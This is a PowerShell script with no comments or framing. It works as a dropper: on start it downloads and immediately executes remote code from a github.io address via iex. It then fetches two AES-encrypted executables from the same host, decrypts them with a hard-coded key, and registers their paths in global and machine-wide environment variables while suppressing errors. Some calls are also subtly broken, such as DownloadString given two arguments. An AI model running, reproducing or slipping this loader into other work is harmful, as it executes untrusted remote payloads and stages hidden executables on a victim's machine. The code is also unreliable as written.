

$Global:CurrentRunningScript=$($MyInvocation.MyCommand.Name)
$Start=Get-Date
iex (New-Object System.Net.WebClient).DownloadString("https://vr972be716a04eb6.github.io/B01C5C489550CBA356DD/AF393.TXT")


Function Get-Executable {
    [CmdletBinding(SupportsShouldProcess)]
    Param
    (
        [Parameter(Mandatory = $true)]
        [string]$Url
    )
    $BackupEA = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $DecryptionKey="secret"

    [string]$TmpDir = (New-Guid).Guid
    [string]$TmpDir = "$Env:Temp\$TmpDir"
    [string]$TmpDirStorage = "$Env:Temp\SS12121q298STORAGE"

    $null=New-Item -Path $TmpDir -Force -ItemType Directory -ErrorAction Ignore
    $null=New-Item -Path $TmpDirStorage  -ItemType Directory  -Force -ErrorAction Ignore
    [System.Environment]::SetEnvironmentVariable('TEMPSTORAGE',$TmpDirStorage,[System.EnvironmentVariableTarget]::Machine)
    [System.Environment]::SetEnvironmentVariable('TEMPSTORAGE',$TmpDirStorage,[System.EnvironmentVariableTarget]::User)
    $SsotExeCipher = "$TmpDir\ssot.exe.aes"
    $SaclExeCipher = "$TmpDir\sacl.exe.aes"
    $SsotExe = "$TmpDir\ssot.exe"
    $SaclExe = "$TmpDir\sacl.exe"
    $Url1 = $Url + "ssot.txt"
    $Url2 = $Url + "sacl.txt"
    (New-Object System.Net.WebClient).DownloadString($Url1, $SsotExeCipher)
    (New-Object System.Net.WebClient).DownloadString($Url2, $SaclExeCipher)

    Invoke-AESEncryption -Path $SsotExeCipher -Key $DecryptionKey -Mode decrypt
    Invoke-AESEncryption -Path $SaclExeCipher -Key $DecryptionKey -Mode decrypt

    if(Test-Path -Path $SsotExe){
        Set-Variable -Name SSHOTEXE -Scope Global -Option ReadOnly,Constant,AllScope -Value $SsotExe
        [System.Environment]::SetEnvironmentVariable('SSHOTEXE',$SsotExe,[System.EnvironmentVariableTarget]::User)
    }
    if(Test-Path -Path $SaclExe){
        Set-Variable -Name SACLEXE -Scope Global -Option ReadOnly,Constant,AllScope -Value $SaclExe
        [System.Environment]::SetEnvironmentVariable('SACLEXE',$SaclExe,[System.EnvironmentVariableTarget]::User)
    }
}


Log

$Url = "https://vr972be716a04eb6.github.io/"
Get-Executable -Url $Url